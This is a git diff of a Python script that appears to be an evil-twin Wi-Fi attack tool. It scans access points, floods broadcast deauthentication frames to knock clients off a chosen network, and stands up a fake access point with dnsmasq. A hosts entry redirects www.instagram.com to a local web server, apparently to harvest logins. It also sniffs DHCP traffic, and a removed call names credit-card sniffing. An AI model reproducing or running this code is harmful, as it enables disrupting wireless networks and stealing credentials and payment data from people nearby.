@@ -13,9 +13,9 @@ from scapy.layers.inet import IP
 aps_dict = {}
 
 def print_wifi_list():
-    header = PrettyTable(['SSID', 'MAC ADRESS', 'BEACONS'])
+    header = PrettyTable(['SSID', 'MAC ADRESS'])
     for ssid, mac_beacons in aps_dict.items():
-        header.add_row([ssid, str(mac_beacons[0]), str(mac_beacons[1])])
+        header.add_row([ssid, str(mac_beacons)])
     print(header)
 
 
@@ -31,8 +31,9 @@ def choose_ssid():
 def deauth_attack(gateway_mac, interface):
     print("hello" + gateway_mac)
     target_mac = "ff:ff:ff:ff:ff:ff"
-    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=gateway_mac,
-                                addr3=gateway_mac) / Dot11Deauth(reason=7)
+    #target_mac = "08:c5:e1:87:79:c1"
+
+    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)
     sendp(packet, iface=interface, count=10000, inter=0.1)
 
 
@@ -65,9 +66,9 @@ def start_monitor_airmon(interfaceName):
 
 
 def change_host_file():
-    apacheIP = ni.ifaddresses('wlp2s0')[ni.AF_INET][0]['addr']  # the physics address of wlp2s0
+    apacheIP = ni.ifaddresses('wlp2s0')[ni.AF_INET][0]['addr'] 
     nameOfHostsFile = 'dnsmasq.hosts'
-    text = apacheIP + ' ' + 'www.instagram1.com'
+    text = apacheIP + ' ' + 'www.instagram.com'
     write_file(nameOfHostsFile, text)
 
 
@@ -88,13 +89,12 @@ def dnsmasq_service(interface):
            'listen-address=192.168.1.1\n' \
            'addn-hosts=dnsmasq.hosts'
 
+
+
     write_file(nameConfFile, text)
     change_host_file()
-    # set the ip of wlan0 to apIP and netmask of wlan0 to netmask value
     os.system(f'ifconfig {interface} up {apIP} netmask {netmask}')
-    # add routing table
     os.system(f'route add -net 192.168.1.0 netmask {netmask} gw {apIP}')
-    # start dnsmasq with the config file
     os.system(f'dnsmasq -C {nameConfFile} -d')
 
 
@@ -121,20 +121,11 @@ def sniffDHCP(interface):
 
 
 def scanWifi(pkt):
-    if pkt.haslayer(Dot11Beacon):  # check if the pkt is dot11
-        if pkt.type == 0 and pkt.subtype == 8:  # check if ( type 0-Management , 8 - Beacon)
-            # dictionary[Key = ssid(name),Value = (mac of ap, sum of packets)]
-            if not (pkt.info.decode("utf-8") in aps_dict):  # check if the ssid(name) not in the dict
-                # SSID- ptk.info MAC- pkt.addr3
-                aps_dict[pkt.info.decode("utf-8")] = (pkt.addr3, 1)
-            else:
-                numOfBeacons = aps_dict[pkt.info.decode("utf-8")][1]
-                numOfBeacons += 1
-                aps_dict[pkt.info.decode("utf-8")] = (pkt.addr3, numOfBeacons)
-        else:
-            pass
-    else:
-        pass
+    if pkt.haslayer(Dot11Beacon):  
+        if pkt.type == 0 and pkt.subtype == 8:  
+                aps_dict[pkt.info.decode("utf-8")] = (pkt.addr3)
+                
+        
 
 
 if __name__ == '__main__':
@@ -147,10 +138,9 @@ if __name__ == '__main__':
     start_monitor_airmon(interfaceName)
     print("Start Deauthentication attack on " + ssid)
     interfaceName = "wlan0mon"
-    start_new_thread(deauth_attack, ((aps_dict[ssid][0]), interfaceName,))
+    #deauth_attack(aps_dict[ssid][0], interfaceName)
     start_new_thread(create_fake_ap, (ssid, interfaceName,))
     start_new_thread(fowardTraffic, ())
     start_new_thread(dnsmasq_service, (interfaceName,))
     time.sleep(10)
     start_new_thread(sniffDHCP, (interfaceName,))
-    #sniffCreditCard(interfaceName)
